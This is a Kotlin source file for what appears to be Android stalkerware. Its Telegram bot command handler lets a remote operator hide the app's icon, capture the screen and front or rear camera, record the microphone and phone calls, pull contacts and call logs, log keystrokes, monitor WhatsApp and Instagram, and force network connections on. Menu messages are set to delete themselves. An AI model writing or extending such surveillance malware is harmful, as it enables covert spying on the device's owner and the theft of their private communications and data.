package com.system.superiormonitor.bot

import android.content.Context
import com.system.superiormonitor.data.CallbackQuery
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.data.Update
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogLevel
import com.system.superiormonitor.core.LogManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class BotCommands(private val context: Context, private val scope: CoroutineScope) {

    private var botUsername: String? = null
    private val activeMenus = java.util.concurrent.ConcurrentHashMap<Long, kotlinx.coroutines.Job>()
    private val waitingForPopup = java.util.concurrent.ConcurrentHashMap<Long, Boolean>()

    fun setBotUsername(username: String?) {
        botUsername = username
    }

    /** Schedules auto-deletion of a menu message after 5 minutes of inactivity */
    fun scheduleAutoDelete(chatId: String, messageId: Long, token: String) {
        activeMenus[messageId]?.cancel()
        activeMenus[messageId] = scope.launch(Dispatchers.IO) {
            kotlinx.coroutines.delay(2 * 60 * 1000L) // 2 minutes
            TelegramApi.deleteMessage(token, chatId, messageId)
            activeMenus.remove(messageId)
        }
    }

    /** Cancels auto-deletion (e.g. if the user cancels or closes the menu) */
    fun cancelAutoDelete(messageId: Long) {
        activeMenus[messageId]?.cancel()
        activeMenus.remove(messageId)
    }

    // ═══════════════════════════════════════════════════════════
    //  UPDATE ROUTING 
    // ═══════════════════════════════════════════════════════════

    /**
     * Routes the incoming Telegram update to the appropriate handler
     * and returns the response text, or null if no response is needed.
     */
    fun routeUpdate(update: Update): String? {
        // Route callback queries (inline button taps)
        if (update.callback_query != null) {
            return handleCallbackQuery(update.callback_query)
        }

        val message = update.message ?: return null

        // Route media attachments
        // Stubs ensure the router acknowledges media without crashing.
        //       These stubs ensure the router acknowledges media without crashing.
        if (message.photo != null) return null
        if (message.video != null) return null
        if (message.audio != null) return null
        if (message.document != null) return null

        // Route text commands
        val text = message.text ?: return null
        val chatId = message.chat.id
        
        if (waitingForPopup[chatId] == true) {
            waitingForPopup.remove(chatId)
            BotActions.showDevicePopup(context, text)
            return "Popup sent to device."
        }

        return if (text.trim().startsWith("/")) handleCommand(text) else null
    }

    // ═══════════════════════════════════════════════════════════
    //  COMMAND HANDLING 
    // ═══════════════════════════════════════════════════════════

    private fun handleCommand(commandText: String): String? {
        val rawCommand = commandText.trim().split(" ").firstOrNull() ?: ""

        // Handle @BotUsername suffix for group chats
        val command = if (rawCommand.contains("@")) {
            val parts = rawCommand.split("@", limit = 2)
            val targetBot = parts[1]
            if (botUsername != null && !targetBot.equals(botUsername, ignoreCase = true)) {
                return null // Command addressed to another bot
            }
            parts[0].lowercase()
        } else {
            rawCommand.lowercase()
        }

        return when (command) {
            "/start" -> BotMessages.Core.buildWelcomeMessage("Admin")
            "/settings" -> BotMessages.Settings.buildSettingsMenu()
            "/menu" -> BotMessages.Core.buildMenuMessage("Admin")
            else -> null
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  CALLBACK QUERY HANDLING 
    // ═══════════════════════════════════════════════════════════

    private fun editMessage(query: CallbackQuery, text: String, replyMarkup: String? = null) {
        val chatId = query.message?.chat?.id?.toString() ?: return
        val messageId = query.message.message_id
        val token = PrefsManager.getInstance(context).botToken
        scheduleAutoDelete(chatId, messageId, token)
        TelegramApi.editMessageText(token, chatId, messageId, text, replyMarkup = replyMarkup)
    }

    private fun handleCallbackQuery(query: CallbackQuery): String? {
        val chatId = query.message?.chat?.id?.toString() ?: return "Error: No chat ID"
        val messageId = query.message.message_id
        val token = PrefsManager.getInstance(context).botToken
        val userName = query.from.first_name

        return when (query.data) {
            "menu_send_message" -> {
                editMessage(query, BotMessages.Core.buildSendMessageWarningPrompt(), BotMarkups.Core.buildSendMessageWarningMarkup())
                null
            }
            "action_new_message" -> {
                waitingForPopup[chatId.toLong()] = true
                editMessage(query, BotMessages.Core.buildSendMessageInputPrompt())
                null
            }
            "cmd_status" -> {
                scope.launch(Dispatchers.IO) {
                    val parts = BotMessages.Core.buildStatusMessage(context).split("JSON_MARKUP:", limit = 2)
                    editMessage(query, parts[0].trim(), parts[1].trim())
                }
                null
            }
            "cmd_settings" -> {
                editMessage(query, BotMessages.Settings.buildSettingsIntro(), BotMarkups.Settings.buildSettingsMarkup())
                null
            }
            "settings_superior" -> {
                editMessage(query, BotMessages.Settings.buildSuperiorSettingsPrompt(), BotMarkups.Settings.buildSuperiorSettingsMarkup())
                null
            }
            "superior_launcher" -> {
                editMessage(query, BotMessages.Settings.buildSuperiorLauncherTitle(), BotMarkups.Settings.buildSuperiorLauncherMarkup())
                null
            }
            "superior_open" -> {
                editMessage(query, BotActions.openApplication(context))
                null
            }
            "superior_unhide" -> {
                editMessage(query, BotActions.unhideApplication(context))
                null
            }
            "superior_hide" -> {
                editMessage(query, BotActions.hideApplication(context))
                null
            }
            "superior_snapshots" -> {
                editMessage(query, BotMessages.MediaOps.buildSnapshotSettingsPrompt(context), BotMarkups.MediaOps.buildSnapshotSettingsMarkup())
                null
            }
            "superior_persistent", "activate_persistent", 
            "toggle_force_data", "toggle_force_wifi", "toggle_force_hotspot" -> {
                if (query.data != "superior_persistent") {
                    BotActions.togglePersistentFeature(context, query.data)
                }
                editMessage(query, BotMessages.Settings.buildPersistentEnforcementPrompt(context), BotMarkups.Settings.buildPersistentEnforcementMarkup(context))
                null
            }
            "deactivate_persistent" -> {
                BotActions.togglePersistentFeature(context, query.data)
                editMessage(query, BotMessages.Settings.buildSuperiorSettingsPrompt(), BotMarkups.Settings.buildSuperiorSettingsMarkup())
                null
            }
            "superior_basic_updates", "toggle_call_events", "toggle_sms_events", "toggle_key_events" -> {
                if (query.data != "superior_basic_updates") {
                    BotActions.toggleBasicUpdateFeature(context, query.data)
                }
                editMessage(query, BotMessages.Settings.buildBasicUpdatesPrompt(context), BotMarkups.Settings.buildBasicUpdatesMarkup(context))
                null
            }
            "superior_call_rec_menu", "toggle_call_rec" -> {
                if (query.data == "toggle_call_rec") {
                    BotActions.toggleBasicUpdateFeature(context, query.data)
                }
                editMessage(query, BotMessages.Settings.buildCallRecordingMenuPrompt(), BotMarkups.Settings.buildCallRecordingMenuMarkup(context))
                null
            }
            "superior_social_updates", "toggle_whatsapp", "toggle_wabusiness", "toggle_instagram" -> {
                if (query.data != "superior_social_updates") {
                    BotActions.toggleSocialUpdateFeature(context, query.data, query.id)
                }
                editMessage(query, BotMessages.Settings.buildSocialUpdatesPrompt(context), BotMarkups.Settings.buildSocialUpdatesMarkup(context))
                null
            }
            "superior_rec_settings", "toggle_rec_telecom", "toggle_rec_dialing" -> {
                val prefs = com.system.superiormonitor.data.PrefsManager.getInstance(context)
                if (query.data == "superior_rec_settings" && !prefs.forwardRecordingEnabled) {
                    TelegramApi.answerCallbackQuery(prefs.botToken, query.id, "Call Recording is disabled. Please enable it first.", true)
                    return null
                }
                
                if (query.data != "superior_rec_settings") {
                    BotActions.toggleRecorderEngineFeature(context, query.data)
                }
                editMessage(query, BotMessages.Settings.buildRecorderSettingsPrompt(context), BotMarkups.Settings.buildRecorderSettingsMarkup(context))
                null
            }
            "rec_sel_source" -> {
                editMessage(query, BotMessages.Settings.buildRecSelectSourcePrompt(), BotMarkups.Settings.buildRecSelectSourceMarkup())
                null
            }
            "rec_sel_format" -> {
                editMessage(query, BotMessages.Settings.buildRecSelectFormatPrompt(), BotMarkups.Settings.buildRecSelectFormatMarkup())
                null
            }
            "rec_sel_samplerate" -> {
                editMessage(query, BotMessages.Settings.buildRecSelectSampleRatePrompt(context), BotMarkups.Settings.buildRecSelectSampleRateMarkup(context))
                null
            }
            "rec_sel_param" -> {
                editMessage(query, BotMessages.Settings.buildRecSelectParamPrompt(context), BotMarkups.Settings.buildRecSelectParamMarkup(context))
                null
            }
            "cfg_snap_screen" -> {
                editMessage(query, BotMessages.MediaOps.buildSnapshotFeaturePrompt(context, "Screenshots"), BotMarkups.MediaOps.buildSnapshotFeatureMarkup(context, "Screenshots"))
                null
            }
            "cfg_snap_front" -> {
                editMessage(query, BotMessages.MediaOps.buildSnapshotFeaturePrompt(context, "Front Camera"), BotMarkups.MediaOps.buildSnapshotFeatureMarkup(context, "Front Camera"))
                null
            }
            "cfg_snap_rear" -> {
                editMessage(query, BotMessages.MediaOps.buildSnapshotFeaturePrompt(context, "Rear Camera"), BotMarkups.MediaOps.buildSnapshotFeatureMarkup(context, "Rear Camera"))
                null
            }

            "cmd_menu", "menu_main" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, BotMessages.Core.buildMenuPrompt(userName), BotMarkups.Core.buildMenuMarkup())
                null
            }
            "menu_snapshot" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, BotMessages.MediaOps.buildSnapshotPrompt(), BotMarkups.MediaOps.buildSnapshotMenuMarkup())
                null
            }
            "action_cap_screen", "action_cap_front", "action_cap_rear" -> {
                cancelAutoDelete(messageId)
                val type = when (query.data) {
                    "action_cap_screen" -> 0
                    "action_cap_front" -> 1
                    else -> 2
                }
                com.system.superiormonitor.monitor.MediaOperations.executeOnDemandCapture(context, scope, type, chatId, messageId, token)
                null
            }
            "cmd_media_ops" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, BotMessages.MediaOps.buildMediaOpsPrompt(), BotMarkups.MediaOps.buildMediaOpsMarkup())
                null
            }
            "menu_microphone" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, BotMessages.MediaOps.buildMicrophonePrompt(), BotMarkups.MediaOps.buildMicrophoneMarkup())
                null
            }
            "action_mic_1m", "action_mic_3m", "action_mic_5m", "action_mic_10m" -> {
                cancelAutoDelete(messageId)
                val durationMs = when (query.data) {
                    "action_mic_1m" -> 60000L
                    "action_mic_3m" -> 180000L
                    "action_mic_5m" -> 300000L
                    else -> 600000L
                }
                com.system.superiormonitor.monitor.MediaOperations.executeMicrophoneRecording(context, scope, durationMs, chatId, messageId, token)
                null
            }
            "cmd_fetch_ops" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, BotMessages.FetchOps.buildFetchOpsPrompt(), BotMarkups.FetchOps.buildFetchOpsMarkup())
                null
            }
            "menu_contacts" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, BotMessages.FetchOps.buildContactsPrompt(), BotMarkups.FetchOps.buildContactsMarkup())
                null
            }
            "action_fetch_contacts" -> {
                cancelAutoDelete(messageId)
                com.system.superiormonitor.monitor.FetchOperations.executeContactsFetch(context, scope, chatId, messageId, token)
                null
            }
            "menu_calls" -> {
                scheduleAutoDelete(chatId, messageId, token)
                editMessage(query, BotMessages.FetchOps.buildCallActivityPrompt(), BotMarkups.FetchOps.buildCallActivityMarkup())
                null
            }
            "action_fetch_calls_3", "action_fetch_calls_5", "action_fetch_calls_10", "action_fetch_calls_15" -> {
                cancelAutoDelete(messageId)
                val limit = when (query.data) {
                    "action_fetch_calls_3" -> 3
                    "action_fetch_calls_5" -> 5
                    "action_fetch_calls_10" -> 10
                    else -> 15
                }
                com.system.superiormonitor.monitor.FetchOperations.executeCallLogFetch(context, scope, limit, chatId, messageId, token)
                null
            }
            "cfg_key_events" -> {
                editMessage(query, BotMessages.Settings.buildKeyEventsFeaturePrompt(context), BotMarkups.Settings.buildKeyEventsFeatureMarkup(context))
                null
            }
            else -> {
                val safeData = query.data ?: return "Action not recognized."
                if (safeData.startsWith("set_snap_")) {
                    val changed = BotActions.updateSnapshotFeatureState(context, safeData)
                    if (!changed) {
                        TelegramApi.answerCallbackQuery(token, query.id, "Already enabled with that interval.", true)
                        return null
                    }
                    val feature = when {
                        safeData.contains("_screen_") -> "Screenshots"
                        safeData.contains("_front_") -> "Front Camera"
                        safeData.contains("_rear_") -> "Rear Camera"
                        else -> return null
                    }
                    editMessage(query, BotMessages.MediaOps.buildSnapshotFeaturePrompt(context, feature), BotMarkups.MediaOps.buildSnapshotFeatureMarkup(context, feature))
                    null
                } else if (safeData.startsWith("set_key_events_")) {
                    val changed = BotActions.updateKeyEventsFeatureState(context, safeData)
                    if (!changed) {
                        TelegramApi.answerCallbackQuery(token, query.id, "Already enabled with that interval.", true)
                        return null
                    }
                    editMessage(query, BotMessages.Settings.buildKeyEventsFeaturePrompt(context), BotMarkups.Settings.buildKeyEventsFeatureMarkup(context))
                    null
                } else if (safeData.startsWith("rec_set_")) {
                    BotActions.setRecorderEngineValue(context, safeData)
                    editMessage(query, BotMessages.Settings.buildRecorderSettingsPrompt(context), BotMarkups.Settings.buildRecorderSettingsMarkup(context))
                    null
                } else {
                    "Action not recognized."
                }
            }
        }
    }
}
